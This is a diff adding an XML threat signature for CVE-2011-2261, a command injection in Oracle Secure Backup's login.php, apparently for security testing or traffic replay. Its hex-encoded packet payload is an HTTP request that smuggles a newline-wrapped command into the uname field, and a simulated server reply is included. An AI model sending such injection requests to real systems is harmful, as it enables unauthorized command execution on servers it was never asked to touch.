@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Oracle Secure Backup Administration Server validate_login Command Injection(IPv6 Version)"/>
+    <EngDesc display="true" value="A command injection vulnerability exists in Oracle Secure Backup Administration server. The vulnerability is due to insufficient filtering of user supplied data to the login.php script used in the administration server. Remote unauthenticated attackers can exploit this vulnerability by sending a crafted HTTP request to the target host.            Successful exploitation would allow for arbitrary command execution in the security context of the user running the web server of Oracle Secure Backup. The behaviour of the target is entirely dependent on the intended function of the injected command.&#13;&#10;"/>
+    <Intent display="true">
+      <item value="Command_Injection"/>
+    </Intent>
+    <Protocol display="true" value="IPV6,HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Oracle"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Secure_Backup"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="10.3.0.3_and_prior"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20110722-15"/>
+    <CVEID display="true" value="CVE-2011-2261"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Jim"/>
+    <ID display="true" value="80fe5ec422b31f0f95a0ef1cfc7ab725"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="network"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634475319729167500"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1311931820" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="srcIP" type="ImperfectControls.IPv6Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+    <for index="B">
+      <for index="D"/>
+      <for index="C"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:17:A4:8F:13:8D" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$srcIP" Destination-Address="$destIP">
+        <TCP srcPort="56056" destPort="$HTTPdestPort" SeqNumber="F57913D9" AckNumber="F0DBD72E" HeaderLength="08" WindowSize="002E" Checksum="5D83" UrgentPointer="0000" Options="0101080A0D50A7650D3ADD3C" Payload="474554202F6C6F67696E2E7068703F617474656D70743D3126756E616D653D253061706F632E736825306120485454502F312E310D0A486F73743A203137322E31362E312E31320D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:17:A4:8F:13:8D" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$destIP" Destination-Address="$srcIP">
+          <TCP srcPort="$HTTPdestPort" destPort="56056" SeqNumber="F0DBD72E" AckNumber="F5791425" HeaderLength="08" WindowSize="05A8" Checksum="4953" UrgentPointer="0000" Options="0101080A0D3ADE120D50A765" Payload="485454502F312E3120323030204F4B0D0A446174653A205468752C203238204A756C20323031312031393A32353A303820474D540D0A5365727665723A204170616368652F322E322E31352028556E697829206D6F645F73736C2F322E322E3135204F70656E53534C2F302E392E386D205048502F342E342E390D0A582D506F77657265642D42793A205048502F342E342E390D0A436F6E74656E742D4C656E6774683A20323936340D0A436F6E74656E742D547970653A20746578742F68746D6C0D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
